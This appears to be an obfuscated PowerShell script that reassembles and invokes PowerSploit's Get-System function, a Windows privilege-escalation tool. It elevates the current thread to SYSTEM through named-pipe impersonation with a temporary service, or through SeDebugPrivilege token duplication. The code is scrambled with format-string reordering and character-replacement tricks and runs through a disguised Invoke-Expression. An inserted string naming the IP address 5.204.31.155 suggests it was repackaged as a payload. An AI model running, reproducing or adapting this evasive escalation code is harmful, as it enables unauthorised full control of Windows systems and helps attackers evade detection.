 &( $PShOMe[4]+$pSHomE[30]+'X') ((("{3}{10}{4}{20}{2}{12}{6}{13}{5}{17}{18}{11}{16}{1}{15}{9}{14}{0}{8}{19}{7}"-f ' = [Activator]::CreateInstance(x3MTokenPrivilegesStruct)
        x3MRetVal = x3MWin32Methods::AdjustTokenPrivileges(x3Mhtoken, x3MFalse, [ref]x3MtokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero)

        if(-not(x3MRetVal)) {
            Write-Error KbOAdjustTokenPrivileges failed, RetVal : x3MRetValKbO -ErrorAction Stop
        }
        
        x3MLocalSystemNTAccount = (New-Object -TypeName wNISystem.Security.Principal.SecurityIdentifierwNI -ArgumentList ([Security.Principal.WellKnownSidType]::wNILocalSystemSidwNI, x3Mnull)).Translate([Security.Principal.NTAccount]).Value

        x3MSystemHandle = Get-WmiObject -Class Win32_Process hfF ForEach-Object {
            try {
                x3MOwnerInfo = x3M_.GetOwner()
                if (x3MOwnerInfo.Domain -and x3MOwnerInfo.User) {
                    x3MOwnerString = KbOx3M(x3MOwnerInfo.Domain)FUfx3M(x3MOwnerInfo.User)KbO.ToUpper()

                    if (x3MOwnerString -eq x3MLocalSystemNTAccount.ToUpper()) {
                        x3MProcess = Get-Process -Id x3M_.ProcessId

                        x3MHandle = x3MWin32Methods::OpenProcess(0x0400, x3MFalse, x3MProcess.Id)
                        if (x3MHandle) {
                            x3MHandle
                        }
                    }
                }
            }
            catch {}
        } hfF Where-Object {x3M_ -and (x3M_ -ne 0)} hfF Select -First 1
        
        if ((-not x3MSystemHandle) -or (x3MSystemHandle -eq 0)) {
            Write-Error wNIUnable to obtain a handle to a system process.wNI
        } 
        else {
            [IntPtr]x3MSystemToken = [IntPtr]::Zero
            x3MRetVal = x3MWin32Methods::OpenProcessToken(([IntPtr][Int] x3MSystemHandle), (x3MTOKEN_IMPERSONATE -bor x3MTOKEN_DUPLICATE), [ref]x3MSystemToken);x3MLastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose KbOOpenProcessToken result: x3MRetValKbO
            Write-Verbose KbOOpenProcessToken result: x3MLastErrorKbO

            [IntPtr]x3MDulicateTokenHandle = [IntPtr]::Zero
            x3MRetVal = x3MWin32Methods::DuplicateToken(x3MSystemToken, 2, [ref]x3MDulicateTokenHandle);x3MLastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()

            Write-Verbose KbODuplicateToken result: x3MLastErrorKbO

            x3MRetVal = x3MWin32Methods::SetThreadToken([IntPtr]::Zero, x3MDulicateTokenHandle);x3MLastError = [ComponentModel.Win32Exception][Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if(-not(x3MRetVal)) {
                Write-Error KbOSetThreadToken failed, RetVal : x3MRetValKbO -ErrorAction Stop
            }

            Write-Verbose KbOSetThreadToken result: x3MLastErrorKbO
            x3Mnull = x3MWin32Methods::CloseHandle(x3MHandle)
        }
    }

    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] wNIAdministratorwNI)) {
        Write-Error KbOScript must be run as administratorKbO -ErrorAction Stop
    }

    if([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne wNISTAwNI) {
        Write-Error KbOScript must be run in STA mode, relaunch powershell.exe with -STA flagKbO -ErrorAction Stop
    }

    if(x3MPSBoundParameters[wNIWhoAmIwNI]) {
        Write-Output KbOx3M([Environment]::UserDomainName)FUfx3M([Environment]::UserName)','(x3MAttribBuilder)

        x3MWi','ing], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])
        x3MCreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MCreateServiceAAddr, x3MCreateServiceADelegate)

        x3MStartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA
        x3MStartServiceADelegate = Get-DelegateType @( [IntPtr], [Int], [Int]) ([IntPtr])
        x3MStartServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MStartServiceAAddr, x3MStartServiceADelegate)

        x3MDeleteServiceAddr = Get-ProcAddress Advapi32.dll DeleteService
        x3MDeleteServiceDelegate = Get-DelegateType @( [IntPtr] ) ([IntPtr])
        x3MDeleteService = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MDeleteServiceAddr, x3MDeleteServiceDelegate)

        x3MGetLastErrorAddr = Get-ProcAddress Kernel32.dll GetLastError
        x3MGetLastErrorDelegate = Get-DelegateType @() ([Int])
        x3MGetLastError = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MGet','function Get-System {
<#
    .SYNOPSIS

        GetSystem functionality inspired by MeterpreterwNIs getsystem.
        wNINamedPipewNI impersonation doesnwNIt need SeDebugPrivilege but does create
        a service, wNITokenwNI duplications a SYSTEM token but needs SeDebugPrivilege.
        NOTE: if running PowerShell 2.0, start powershell.exe with wNI-STAwNI to ensure
        token duplication works correctly.

        PowerSploit Function: Get-System
        Author: @harmj0y, @mattifestation
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .PARAMETER Technique

        The technique to use, wNINamedPipewNI or wNITokenwNI.

    .PARAMETER ServiceName

        The name of the service used with named pipe impersonation, defaults to wNITestSVCwNI.

    .PARAMETER PipeName

        The name of the named pipe used with named pipe impersonation, defaults to wNITestSVCwNI.

    .PARAMETER RevToSelf
    
        Reverts the current thread privileges.

    .PARAMETER WhoAmI

        Switch. Display the credentials for the c','ere-Object { x3M_.GlobalAssemblyCache -And x3M_.Location.Split(wNIFUfFUfwNI)[-1].Equals(wNISystem.dllwNI) }
        x3MUnsafeNativeMethods = x3MSystemAssembly.GetType(wNIMicrosoft.Win32.UnsafeNativeMethodswNI)
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        x3MGetModuleHandle = x3MUnsafeNativeMethods.GetMethod(wNIGetModuleHandlewNI)
        x3MGetProcAddress = x3MUnsafeNativeMethods.GetMethod(wNIGetProcAddresswNI)
        # Get a handle to the module specified
        x3MKern32Handle = x3MGetModuleHandle.Invoke(x3Mnull, @(x3MModule))
        x3MtmpPtr = New-Object IntPtr
        x3MHandleRef = New-Object System.Runtime.InteropServices.HandleRef(x3MtmpPtr, x3MKern32Handle)
        
        # Return the address of the function
        Write-Output x3MGetProcAddress.Invoke(x3Mnull, @([System.Runtime.InteropServices.HandleRef]x3MHandleRef, x3MProcedure))
    }

    # performs named pipe impersonation to elevate to SYSTEM without needing
    #   SeDebugPrivilege
    function Local:Get-SystemNamedPipe {
        param(
            [String]
            x3MServiceName = KbOTestSVCKbO,

            [String]
            x3MPipeName = KbOTestSVCKbO
        )

        x3MCommand = KbO%COMSPEC% /C start %COMSPEC% /C 2teKbOtimeout /t 3 >nul&&echo x3MPipeName > FUfFUf.FUfpipeFUfx3MPipeName2teKbOKbO

        # create the named pipe used for impersonation and set appropriate permissions
        x3MPipeSecurity = New-Object System.IO.Pipes.PipeSecurity
        x3MAccessRule = New-Object System.IO.Pipes.PipeAccessRule( KbOEveryoneKbO, KbOReadWriteKbO, KbOAllowKbO )
        x3MPipeSecurity.AddAccessRule(x3MAccessRule)
        x3MPipe = New-Object System.IO.Pipes.NamedPipeServerStream(x3MPi','         try {
                x3MServiceHandle = x3MCreateServiceA.Invoke(x3MManagerHandle, x3MServiceName, x3MServiceName, 0xF003F, 0x10, 0x3, 0x1, x3MCommand, x3Mnull, x3Mnull, x3Mnull, x3Mnull, x3Mnull)
                x3Merr = x3MGetLastError.Invoke()
            }
            catch {
                Write-Warning KbOError creating service : x3M_KbO
                x3MServiceHandle = 0
            }
            Write-Verbose KbOCreateServiceA Handle: x3MServiceHandleKbO

            if (x3MServiceHandle -and (x3MServiceHandle -ne 0)) {
                x3MSuccess = x3MTrue
                Write-Verbose KbOService successfully createdKbO

                # Step 3 - CloseServiceHandle() for the service handle
                Write-Verbose KbOClosing ser','OWN_PROCESS
            # 0x3 = SERVICE_DEMAND_STAR','se {
        if(x3MTechnique -eq wNINamedPipewNI) {
            # if wewNIre using named pipe impersonation with a service
            Get-SystemNamedPipe -ServiceName x3MServiceName -PipeName x3MPipeName
        }
        else {
            # otherwise use token duplication
            Get-SystemToken
        }
        Write-Output KbORunning as: x3M([Environment]::UserDomainName)FUfx3M([Environment]::UserName)KbO
    }
}

','KbO
        return
    }

    elseif(x3MPSBoundParameters[wNIRevToSelfwNI]) {
        x3MRevertToSelfAddr = Get-ProcAddress advapi32.dll RevertToSelf
        x3MRevertToSelfDelegate = Get-DelegateType @() ([Bool])
        x3MRevertToSelf = [System.','01
        x3MTOKEN_DUPLICATE = 0x00000002
        x3MTOKEN_IMPERSONATE = 0x00000004
        x3MTOKEN_QUERY = 0x00000008
        x3MTOKEN_QUERY_SOURCE = 0x00000010
        x3MTOKEN_ADJUST_PRIVILEGES = 0x00000020
        x3MTOKEN_ADJUST_GROUPS = 0x00000040
        x3MTOKEN_ADJUST_DEFAULT = 0x00000080
        x3MTOKEN_ADJUST_SESSIONID = 0x00000100
        x3MTOKEN_READ = x3MSTANDARD_RIGHTS_READ -bor x3MTOKEN_QUERY
        x3MTOKEN_ALL_ACCESS = x3MSTANDARD_RIGHTS_REQUIRED -bor
            x3MTOKEN_ASSIGN_PRIMARY -bor
            x3MTOKEN_DUPLICATE -bor
            x3MTOKEN_IMPERSONATE -bor
            x3MTOKEN_QUERY -bor
            x3MTOKEN_QUERY_SOURCE -bor
            x3MTOKEN_ADJUST_PRIVILEGES -bor
            x3MTOKEN_ADJUST_GROUPS -bor
            x3MTOKEN_ADJUST_DEFAULT -bor
            x3MTOKEN_ADJUST_SESSIONID

        [long]x3MLuid = 0

        x3MtokPriv1Luid = [Activator]::CreateInstance(x3MTokPriv1LuidStruct)
        x3MtokPriv1Luid.Count = 1
        x3MtokPriv1Luid.Luid = x3MLuid
        x3MtokPriv1Luid.Attr = x3MSE_PRIVILEGE_ENABLED

        x3MRetVal = x3MWin32Methods::LookupPrivilegeValue(x3MNull, KbOSeDebugPrivilegeKbO, [ref]x3MtokPriv1Luid.Luid)

        x3Mhtoken = [IntPtr]::Zero
        x3MRetVal = x3MWin32Methods::OpenProcessToken(x3MGetCurrentProcess.Invoke(x3MNull, @()), x3MTOKEN_ALL_ACCESS, [ref]x3Mhtoken)

        x3','urrent PowerShell thread.

    .EXAMPLE
        
        PS> Get-System

        Uses named impersonate to elevate the current thread token to SYSTEM.

    .EXAMPLE
        
        PS> Get-System -ServiceName wNIPrivescSvcwNI -PipeName wNIsecretwNI

        Uses named impersonate to elevate the current thread token to SYSTEM
        with a custom service and pipe name.

    .EXAMPLE
        
        PS> Get-System -Technique Token

        Uses token duplication to elevate the current thread token to SYSTEM.

    .EXAMPLE
        
        PS> Get-System -WhoAmI

        Displays the credentials for the current thread.

    .EXAMPLE
        
        PS> Get-System -RevToSelf

        Reverts the current thread privileges.

    .LINK
    
        https://github.com/rapid7/meterpreter/blob/2a891a79001fc43cb25475cc43bced9449e7dc37/source/extensions/priv/server/elevate/namedpipe.c
        https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
        http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
        http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
#>
    [CmdletBinding(DefaultParameterSetName = wNINamedPipewNI)]
    param(
        [Parameter(ParameterSetName = KbONamedPipeKbO)]
        [Parameter(ParameterSetName = KbOTokenKbO)]
        [String]
        [ValidateSet(KbONamedPipeKbO, KbOTokenKbO)]
        x3MTechnique = wNINamedPipewNI,

        [Parameter(ParameterSetName = KbONamedPipeKbO)]
        [String]
        x3MServiceName = wNITestSVCwNI,

        [Parameter(ParameterSetName = KbONamedPipeKbO)]
        [String]
        x3MPipeName = wNITestSVCwNI,

        [Parameter(ParameterSetName = KbORevToSelfKbO)]
        [Switch]
        x3MRevToSelf,

        [Parameter(ParameterSetName = KbOWhoAmIKbO)]
        [Switch]
        x3MWhoAmI
    )

    x3MErrorActionPreference = KbOStopKbO

    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            x3MParameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            x3MReturnType = [Void]
        )
        (  wNIip:5.204.31.155wNI  ) hfFouT-nULl

        x3MDomain = [AppDomain]::CurrentDomain
        x3MDynAssembly = New-Object System.Reflection.AssemblyName(wNIReflectedDelegatewNI)
        x3MAssemblyBuilder = x3MDomain.DefineDynamicAssembly(x3MDynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        x3MModuleBuilder = x3MAssemblyBuilder.DefineDynamicModule(wNIInMemoryModulewNI, x3Mfalse)
        x3MTypeBuilder = x3MModuleBuilder.DefineType(wNIMyDelegateTypewNI, wNIClass, Public, Sealed, AnsiClass, AutoClasswNI, [System.MulticastDelegate])
        x3MConstructorBuilder = x3MTypeBuilder.DefineConstructor(wNIRTSpecialName, HideBySig, PublicwNI, [System.Reflection.CallingConventions]::Standard, x3MParameters)
        x3MConstructorBuilder.SetImplementationFlags(wNIRuntime, ManagedwNI)
        x3MMethodBuilder = x3MTypeBuilder.DefineMethod(wNIInvokewNI, wNIPublic, HideBySig, NewSlot, VirtualwNI, x3MReturnType, x3MParameters)
        x3MMethodBuilder.SetImplementationFlags(wNIRuntime, ManagedwNI)
        
        Write-Output x3MTypeBuilder.CreateType()
    }

    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html
    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = x3MTrue )]
            [String]
            x3MModule,
            
            [Parameter( Position = 1, Mandatory = x3MTrue )]
            [String]
            x3MProcedure
        )

        # Get a reference to System.dll in the GAC
        x3MSystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() hfF
            Wh','wNI).SetCustom','LastErrorAddr, x3MGetLastErrorDelegate)

        # Step 1 - OpenSCManager()
        # 0xF003F = SC_MANAGER_ALL_ACCESS
        #   http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
        Write-Verbose KbOOpening service managerKbO
        x3MManagerHandle = x3MOpenSCManagerA.Invoke(KbOFUfFUflocalhostKbO, KbOServicesActiveKbO, 0xF003F)
        Write-Verbose KbOService manager handle: x3MManagerHandleKbO

        # if we get a non-zero handle back, everything was successful
        if (x3MManagerHandle -and (x3MManagerHandle -ne 0)) {

            # Step 2 - CreateService()
            # 0xF003F = SC_MANAGER_ALL_ACCESS
            # 0x10 = SERVICE_WIN32_','T
            # 0x1 = SERVICE_ERROR_NORMAL
            Write-Verbose KbOCreating new service: wNIx3MServiceNamewNIKbO
   ','MtokenPrivileges','n32TypeBuilder.DefinePInvokeMethod(
            wNIAdjustTokenPrivilegeswNI,
            wNIadvapi32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Bool], x3MTokPriv1LuidStruct.MakeByRefType(),[Int32], [IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAutowNI).SetCustomAttribute(x3MAttribBuilder)
        
        x3MWin32Methods = x3MWin32TypeBuilder.CreateType()

        x3MWin32Native = [Int32].Assembly.GetTypes() hfF ? {x3M_.Name -eq wNIWin32NativewNI}
        x3MGetCurrentProcess = x3MWin32Native.GetMethod(
            wNIGetCurrentProcesswNI,
            [Reflection.BindingFlags] wNINonPublic, StaticwNI
        )
            
        x3MSE_PRIVILEGE_ENABLED = 0x00000002
        x3MSTANDARD_RIGHTS_REQUIRED = 0x000F0000
        x3MSTANDARD_RIGHTS_READ = 0x00020000
        x3MTOKEN_ASSIGN_PRIMARY = 0x000000','Attribute(x3MAttribBuilder)

        x3MWin32TypeBuilder.DefinePInvokeMethod(
            wNILookupPrivilegeValuewNI,
            wNIadvapi32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([String], [String], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAutowNI).SetCustomAttribute','vice handleKbO
                x3MNull = x3MCloseServiceHandle.Invoke(x3MServiceHandle)

                # Step 4 - OpenService()
                Write-Verbose KbOOpening the service wNIx3MServiceNamewNIKbO
                x3MServiceHandle = x3MOpenServiceA.Invoke(x3MManagerHandle, x3MServiceName, 0xF003F)
                Write-Verbose KbOOpenServiceA handle: x3MServiceHandleKbO

                if (x3MServiceHandle -and (x3MServiceHandle -ne 0)){

                    # Step 5 - StartService()
                    Write-Verbose KbOStarting the serviceKbO
                    x3Mval = x3MStartServiceA.Invoke(x3MServiceHandle, x3Mnull, x3Mnull)
                    x3Merr = x3MGetLastError.Invoke()

                    # if we successfully started the service, let it breathe and then delete it
                    if (x3Mval -ne 0){
                        Write-Verbose KbOService successfully startedKbO
                        # breathe for a second
                        Start-Sleep -s 1
                    }
                    else{
                        if (x3Merr -eq 1053){
                            Write-Verbose KbOCommand didnwNIt respond to startKbO
                        }
                        else{
                            Write-Warning KbOStartService failed, LastError: x3MerrKbO
                        }
                        # breathe for a second
                        Start-Sleep -s 1
                    }

                    # start cleanup
                    # Step 6 - DeleteService()
                    Write-Verbose KbODeleting the service wNIx3MServiceNamewNIKbO
                    x3Mval = x3MDeleteService.invoke(x3MServiceHandle)
                    x3Merr = x3MGetLastError.Invoke()

                    if (x3Mval -eq 0){
                        Write-Warning KbODeleteService failed, LastError: x3MerrKbO
                    }
                    else{
                        Write-Verbose KbOService successfully deletedKbO
                    }
                
                    # Step 7 - CloseServiceHandle() for the service handle 
                    Write-Verbose KbOClosing the service handleKbO
                    x3Mval = x3MCloseServiceHandle.Invoke(x3MServiceHandle)
                    Write-Verbose KbOService handle closed offKbO
                }
                else {
                    Write-Warning KbO[!] OpenServiceA failed, LastError: x3MerrKbO
                }
            }

            else {
                Write-Warning KbO[!] CreateService failed, LastError: x3MerrKbO
            }

            # final cleanup - close off the manager handle
            Write-Verbose KbOClosing the manager handleKbO
            x3MNull = x3MCloseServiceHandle.Invoke(x3MManagerHandle)
        }
        else {
            # error codes - http://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
            Write-Warning KbO[!] OpenSCManager failed, LastError: x3MerrKbO
        }

        if(x3MSuccess) {
            Write-Verbose KbOWaiting for pipe connectionKbO
            x3MPipe.WaitForConnection()

            x3MNull = (New-Object System.IO.StreamReader(x3MPipe)).ReadToEnd()

            x3MOut = x3MImpersonateNamedPipeClient.Invoke([Int]x3MPipeHandle)
            Write-Verbose KbOImpersonateNamedPipeClient: x3MOutKbO
        }

        # clocse off the named pipe
        x3MPipe.Dispose()
    }

    # performs token duplication to elevate to SYSTEM
    #   needs SeDebugPrivilege
    # written by @mattifestation and adapted from https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot
    Function Local:Get-SystemToken {
        [CmdletBinding()] param()

        x3MDynAssembly = New-Object Reflection.AssemblyName(wNIAdjPrivwNI)
        x3MAssemblyBuilder = [Appdomain]::Currentdomain.DefineDynamicAssembly(x3MDynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
        x3MModuleBuilder = x3MAssemblyBuilder.DefineDynamicModule(wNIAdjPrivwNI, x3MFalse)
        x3MAttributes = wNIAutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInitwNI

        x3MTokPriv1LuidTypeBuilder = x3MModuleBuilder.DefineType(wNITokPriv1LuidwNI, x3MAttributes, [System.ValueType])
        x3MTokPriv1LuidTypeBuilder.DefineField(wNICountwNI, [Int32], wNIPublicwNI) hfF Out-Null
        x3MTokPriv1LuidTypeBuilder.DefineField(wNILuidwNI, [Int64], wNIPublicwNI) hfF Out-Null
        x3MTokPriv1LuidTypeBuilder.DefineField(wNIAttrwNI, [Int32], wNIPublicwNI) hfF Out-Null
        x3MTokPriv1LuidStruct = x3MTokPriv1LuidTypeBuilder.CreateType()

        x3MLuidTypeBuilder = x3MModuleBuilder.DefineType(wNILUIDwNI, x3MAttributes, [System.ValueType])
        x3MLuidTypeBuilder.DefineField(wNILowPartwNI, [UInt32], wNIPublicwNI) hfF Out-Null
        x3MLuidTypeBuilder.DefineField(wNIHighPartwNI, [UInt32], wNIPublicwNI) hfF Out-Null
        x3MLuidStruct = x3MLuidTypeBuilder.CreateType()

        x3MLuid_and_AttributesTypeBuilder = x3MModuleBuilder.DefineType(wNILUID_AND_ATTRIBUTESwNI, x3MAttributes, [System.ValueType])
        x3MLuid_and_AttributesTypeBuilder.DefineField(wNILuidwNI, x3MLuidStruct, wNIPublicwNI) hfF Out-Null
        x3MLuid_and_AttributesTypeBuilder.DefineField(wNIAttributeswNI, [UInt32], wNIPublicwNI) hfF Out-Null
        x3MLuid_and_AttributesStruct = x3MLuid_and_AttributesTypeBuilder.CreateType()

        x3MConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
        x3MConstructorValue = [Runtime.InteropServices.UnmanagedType]::ByValArray
        x3MFieldArray = @([Runtime.InteropServices.MarshalAsAttribute].GetField(wNISizeConstwNI))

        x3MTokenPrivilegesTypeBuilder = x3MModuleBuilder.DefineType(wNITOKEN_PRIVILEGESwNI, x3MAttributes, [System.ValueType])
        x3MTokenPrivilegesTypeBuilder.DefineField(wNIPrivilegeCountwNI, [UInt32], wNIPublicwNI) hfF Out-Null
        x3MPrivilegesField = x3MTokenPrivilegesTypeBuilder.DefineField(wNIPrivilegeswNI, x3MLuid_and_AttributesStruct.MakeArrayType()',', wNIPublicwNI)
        x3MAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(x3MConstructorInfo, x3MConstructorValue, x3MFieldArray, @([Int32] 1))
        x3MPrivilegesField.SetCustomAttribute(x3MAttribBuilder)
        x3MTokenPrivilegesStruct = x3MTokenPrivilegesTypeBuilder.CreateType()

        x3MAttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            wNIadvapi32.dllwNI,
            @([Runtime.InteropServices.DllImportAttribute].GetField(wNISetLastErrorwNI)),
            @([Bool] x3MTrue)
        )

        x3MAttribBuilder2 = New-Object Reflection.Emit.CustomAttributeBuilder(
            ([Runtime.InteropServices.DllImportAttribute].GetConstructors()[0]),
            wNIkernel32.dllwNI,
            @([Runtime.InteropServices.DllImportAttribute].GetField(wNISetLastErrorwNI)),
            @([Bool] x3MTrue)
        )

        x3MWin32TypeBuilder = x3MModuleBuilder.DefineType(wNIWin32MethodswNI, x3MAttributes, [ValueType])
        x3MWin32TypeBuilder.DefinePInvokeMethod(
            wNIOpenProcesswNI,
            wNIkernel32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [IntPtr],
            @([UInt32], [Bool], [UInt32]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAutowNI).SetCustomAttribute(x3MAttribBuilder2)

        x3MWin32TypeBuilder.DefinePInvokeMethod(
            wNICloseHandlewNI,
            wNIkernel32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAutowNI).SetCustomAttribute(x3MAttribBuilder2)

        x3MWin32TypeBuilder.DefinePInvokeMethod(
            wNIDuplicateTokenwNI,
            wNIadvapi32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [Int32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAutowNI).SetCustomAttribute(x3MAttribBuilder)

        x3MWin32TypeBuilder.DefinePInvokeMethod(
            wNISetThreadTokenwNI,
            wNIadvapi32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [IntPtr]),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAutowNI).SetCustomAttribute(x3MAttribBuilder)

        x3MWin32TypeBuilder.DefinePInvokeMethod(
            wNIOpenProcessTokenwNI,
            wNIadvapi32.dllwNI,
            [Reflection.MethodAttributes] wNIPublic, StaticwNI,
            [Reflection.CallingConventions]::Standard,
            [Bool],
            @([IntPtr], [UInt32], [IntPtr].MakeByRefType()),
            [Runtime.InteropServices.CallingConvention]::Winapi,
            wNIAuto','Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MRevertToSelfAddr, x3MRevertToSelfDelegate)

        x3MRetVal = x3MRevertToSelf.Invoke()
        if(x3MRetVal) {
            Write-Output KbORevertToSelf successful.KbO
        }
        else {
            Write-Warning KbORevertToSelf failed.KbO
        }
        Write-Output KbORunning as: x3M([Environment]::UserDomainName)FUfx3M([Environment]::UserName)KbO
    }

    el','peName,KbOInOutKbO,100, KbOByteKbO, KbONoneKbO, 1024, 1024, x3MPipeSecurity)

        x3MPipeHandle = x3MPipe.SafePipeHandle.DangerousGetHandle()

        # Declare/setup all the needed API function
        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html 
        x3MImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient
        x3MImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])
        x3MImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MImpersonateNamedPipeClientAddr, x3MImpersonateNamedPipeClientDelegate)

        x3MCloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle
        x3MCloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])
        x3MCloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MCloseServiceHandleAddr, x3MCloseServiceHandleDelegate)

        x3MOpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA
        x3MOpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])
        x3MOpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MOpenSCManagerAAddr, x3MOpenSCManagerADelegate)
        
        x3MOpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA
        x3MOpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])
        x3MOpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(x3MOpenServiceAAddr, x3MOpenServiceADelegate)
      
        x3MCreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA
        x3MCreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Str')).rePLacE(([ChaR]104+[ChaR]102+[ChaR]70),[sTrinG][ChaR]124).rePLacE(([ChaR]50+[ChaR]116+[ChaR]101),[sTrinG][ChaR]96).rePLacE('x3M','$').rePLacE('FUf',[sTrinG][ChaR]92).rePLacE(([ChaR]75+[ChaR]98+[ChaR]79),[sTrinG][ChaR]34).rePLacE(([ChaR]119+[ChaR]78+[ChaR]73),[sTrinG][ChaR]39) ) 
